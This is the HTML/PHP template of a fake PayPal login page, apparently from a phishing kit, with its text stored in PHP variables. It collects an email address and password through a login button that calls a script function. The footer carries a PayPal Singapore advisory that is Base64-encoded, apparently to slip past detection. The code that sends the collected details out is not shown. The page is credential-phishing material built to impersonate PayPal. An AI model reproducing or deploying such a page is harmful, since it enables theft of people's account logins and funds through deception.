<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title><?php echo $Z118_01; ?></title>
    <link rel="stylesheet" href="assets/css/master.css" media="screen" title="no title" charset="utf-8">
    <link rel="icon" type="image/png" href="assets/img/favicon.ico" />
    <script src="assets/js/master.js" charset="utf-8"></script>
    <script src="assets/js/b64.min.js" charset="utf-8"></script>
    <meta name="viewport" content="width=device-width, user-scalable=no">
  </head>
  <body>
    <div class="main_login">
      <div class="inner_login">
        <div class="logo"></div>
        <div class="error hidden">

        </div>
        <div id="email_input">
          <input id="input[email]" placeholder="<?php echo $Z118_02; ?>" />
          <div class="hidden" id="errorMail">
            <?php echo $Z118_04; ?>
          </div>
        </div>
        <div id="password_input">
          <input id="input[password]" type="password" class="password" placeholder="<?php echo $Z118_03; ?>" />
          <div class="hidden" id="errorPassword">
            <?php echo $Z118_05; ?>
          </div>
        </div>

        <button id="input[login]" class="active" onclick="logine()"><?php echo $Z118_06; ?></button>
        <a href="#"><?php echo $Z118_07; ?></a>
        <div class="splitter"></div>
        <button id="input[register]" class="inactive"><?php echo $Z118_08; ?></button>
        <div class="footer">
          <div class="wrapper">
            <a href="#"><?php echo $Z118_09; ?></a>
            <a href="#">Legal</a>
            <h1><?php echo $Z118_11; ?></h1>
            <h2><script>document.write(Base64.decode("Q29uc3VtZXIgYWR2aXNvcnkgLSBQYXlQYWwgUHRlLiBMdGQuLCB0aGUgaG9sZGVyIG9mIFBheVBhbCdzIHN0b3JlZCB2YWx1ZSBmYWNpbGl0eSwgZG9lcyBub3QgcmVxdWlyZSB0aGUgYXBwcm92YWwgb2YgdGhlIE1vbmV0YXJ5IEF1dGhvcml0eSBvZiBTaW5nYXBvcmUuIFVzZXJzIGFyZSBhZHZpc2VkIHRvIHJlYWQgdGhlIDxhIGhyZWY9JyMnPnRlcm1zIGFuZCBjb25kaXRpb25zPC9hPiBjYXJlZnVsbHku"));</script></h2>
          </div>
        </div>
        <div class="load_screen hidden" id="spinner">
          <div class="loading"></div>
          <div class="load_box">
            <div class="spinner">
              <div class="loadings"></div>
            </div>
            <p><?php echo $Z118_12; ?></p>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
